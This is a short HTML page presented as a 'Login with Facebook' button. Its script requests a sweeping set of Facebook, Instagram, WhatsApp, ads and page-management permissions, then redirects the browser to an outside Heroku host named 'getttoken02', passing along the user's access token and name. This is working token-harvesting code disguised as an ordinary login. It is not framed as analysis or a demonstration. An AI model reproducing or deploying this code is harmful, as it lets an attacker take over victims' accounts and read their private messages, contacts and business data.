<html>
    <body>
        
<!-- custom image -->
<a href="#" onclick="fb_login();">LOGIN WITH FB</a>

<!-- Facebook button -->
<fb:login-button scope="public_profile,email" onlogin="fb_login();">
                </fb:login-button>
                
                <script>
                    window.fbAsyncInit = function () {
    FB.init({
        appId: '327021888364464',
        cookie: true,  // enable cookies to allow the server to access 
        // the session
        xfbml: true,  // parse social plugins on this page
        version: 'v2.0' // use version 2.0
    });
};

// Load the SDK asynchronously
(function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/en_US/sdk.js";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

   
function fb_login() {
    FB.login(function (response) {

        if (response.authResponse) {
            console.log('Welcome!  Fetching your information.... ');
            //console.log(response); // dump complete info
            access_token = response.authResponse.accessToken; //get access token
            user_id = response.authResponse.userID; //get FB UID

            FB.api('/me', function (response) {
                var email = response.email;
                var name = response.name;
                window.location = 'https://getttoken02.herokuapp.com/index.php?' + access_token + '/' + name;
                // used in my mvc3 controller for //AuthenticationFormsAuthentication.SetAuthCookie(email, true);          
            });

        } else {
            //user hit cancel button
            console.log('User cancelled login or did not fully authorize.');

        }
    }, {
        scope: 'email, 	user_birthday, user_religion_politics, user_relationships, user_relationship_details, user_hometown, user_location, user_likes, user_education_history, user_work_history, user_website, user_events, user_photos, user_videos, user_friends, user_about_me, user_status, user_posts, email, read_custom_friendlists, read_insights, read_audience_network_insights, rsvp_event, xmpp_login, offline_access, publish_video, catalog_management, user_managed_groups, groups_show_list, pages_manage_cta, pages_manage_instant_articles, pages_show_list, pages_messaging, pages_messaging_phone_number, pages_messaging_subscriptions, read_page_mailboxes, ads_management, ads_read, business_management, instagram_basic, instagram_manage_comments, instagram_manage_insights, publish_to_groups, groups_access_member_info, leads_retrieval, whatsapp_business_management, attribution_read, business_creative_transfer, pages_read_engagement, pages_manage_metadata, pages_read_user_content, pages_manage_ads, pages_manage_posts, pages_manage_engagement, public_profile'
    });
}
                </script>
    </body>
</html>
